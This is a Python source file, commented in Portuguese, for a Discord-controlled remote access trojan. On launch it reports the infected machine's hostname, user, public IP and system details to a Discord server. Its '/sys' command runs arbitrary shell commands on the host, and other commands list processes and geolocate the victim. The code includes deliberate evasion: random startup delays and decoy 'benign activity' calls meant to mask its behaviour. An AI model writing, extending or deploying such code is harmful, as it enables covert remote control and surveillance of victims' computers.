import discord
from discord.ext import commands
from discord.ui import View, Button
import subprocess
import os
import platform
import random
import time
import urllib.request
import json

# Configurações básicas
TOKEN = "token"
GUILD_ID = 1343592669338665038  # Substituir pelo ID do servidor
CHANNEL_NAME = "🌐｜dashboard"

machine_id = platform.node()

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="/", intents=intents)


# Aguarda tempo aleatório para mascarar comportamento
def aguardar_aleatorio():
    delay = random.randint(10, 30)
    print(f"[INFO] A aguardar {delay}s antes de iniciar...")
    time.sleep(delay)


# Função auxiliar para obter o IP público
def get_public_ip():
    try:
        with urllib.request.urlopen("https://api64.ipify.org") as response:
            return response.read().decode().strip()
    except:
        return "IP não disponível"

# Simula ações benignas antes da execução do comando
def simular_atividade_benigna():
    try:
        os.listdir(".")
        platform.processor()
        os.getcwd()
    except:
        pass

# Botão para criar canal de controlo por máquina
class MachineView(View):
    def __init__(self, machine_id):
        super().__init__(timeout=None)
        self.machine_id = machine_id

    @discord.ui.button(label="Controlar", style=discord.ButtonStyle.primary)
    async def controlar(self, interaction: discord.Interaction, button: Button):
        guild = interaction.guild
        category = discord.utils.get(guild.categories, name="Máquinas")
        if not category:
            category = await guild.create_category("Máquinas")

        channel = discord.utils.get(category.text_channels, name=self.machine_id)
        if not channel:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                interaction.user: discord.PermissionOverwrite(view_channel=True)
            }
            channel = await category.create_text_channel(name=self.machine_id, overwrites=overwrites)
        await interaction.response.send_message(f"Canal criado ou já existente: {channel.mention}", ephemeral=True)

# Comando camuflado para executar instruções no sistema
@bot.tree.command(name="sys", description="Executa uma instrução remota.")
async def sys_action(interaction: discord.Interaction, comando: str):
    if interaction.channel.name.lower() == machine_id.lower():
        await interaction.response.defer(thinking=True)  # ✅ Adicionar esta linha
        simular_atividade_benigna()  # Executa ações "inofensivas"
        try:
            output = subprocess.check_output(comando, shell=True, text=True, stderr=subprocess.STDOUT, encoding="cp850")
            if not output:
                output = "(Sem saída)"
        except subprocess.CalledProcessError as e:
            output = e.output
        await interaction.followup.send(f"```{output}```")
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)


@bot.tree.command(name="process", description="Lista os processos em execução na máquina")
async def process(interaction: discord.Interaction):
    if interaction.channel.name.lower() == machine_id.lower():
        simular_atividade_benigna()
        try:
            output = subprocess.check_output("tasklist" if platform.system() == "Windows" else "ps aux", shell=True, text=True, stderr=subprocess.STDOUT, encoding="cp850")
            file_path = "process_list.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(output)
            await interaction.response.send_message("Lista de processos:", file=discord.File(file_path))
            os.remove(file_path)
        except subprocess.CalledProcessError as e:
            await interaction.response.send_message(f"Erro ao obter processos: {e}", ephemeral=True)
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)


@bot.tree.command(name="location", description="Obtém a localização aproximada da")
async def location(interaction: discord.Interaction):
    if interaction.channel.name.lower() == platform.node().lower():
        simular_atividade_benigna()
        try:
            ip = get_public_ip()
            with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
                data = json.loads(response.read().decode())

            if data["status"] == "success":
                embed = discord.Embed(title="📍 Localização Aproximada", color=discord.Color.blue())
                embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=False)
                embed.add_field(name="🌍 País", value=data["country"], inline=True)
                embed.add_field(name="🏙️ Cidade", value=data["city"], inline=True)
                embed.add_field(name="🏢 ISP", value=data["isp"], inline=False)
                embed.set_footer(text="Localização obtida via IP público")

                await interaction.response.send_message(embed=embed)
            else:
                await interaction.response.send_message("❌ Não foi possível obter a localização.")
        except Exception as e:
            await interaction.response.send_message(f"⚠ Erro: {str(e)}", ephemeral=True)
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)



# Evento de inicialização
@bot.event
async def on_ready():
    print(f"✅ Bot {bot.user.name} está online!")
    await bot.tree.sync()
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    if guild:
        canal = discord.utils.get(guild.text_channels, name=CHANNEL_NAME)
        if canal:
            simular_atividade_benigna()
            machine_id = platform.node()
            try:
                machine_user = os.getlogin()
            except:
                machine_user = "Desconhecido"
            ip = get_public_ip()
            os_name = platform.system() + " " + platform.release()
            architecture = platform.architecture()[0]
            cpu_name = platform.processor()

            embed = discord.Embed(title="Nova Máquina Conectada", color=discord.Color.green())
            embed.add_field(name="Hostname", value=f"`{machine_id}`", inline=True)
            embed.add_field(name="Usuário", value=f"`{machine_user}`", inline=True)
            embed.add_field(name="IP Público", value=f"`{ip}`", inline=True)
            embed.add_field(name="Sistema", value=f"`{os_name}`", inline=True)
            embed.add_field(name="Arquitetura", value=f"`{architecture}`", inline=True)
            embed.add_field(name="CPU", value=f"`{cpu_name}`", inline=False)
            
            view = MachineView(machine_id)
            await canal.send(embed=embed, view=view)

aguardar_aleatorio()
bot.run(TOKEN)
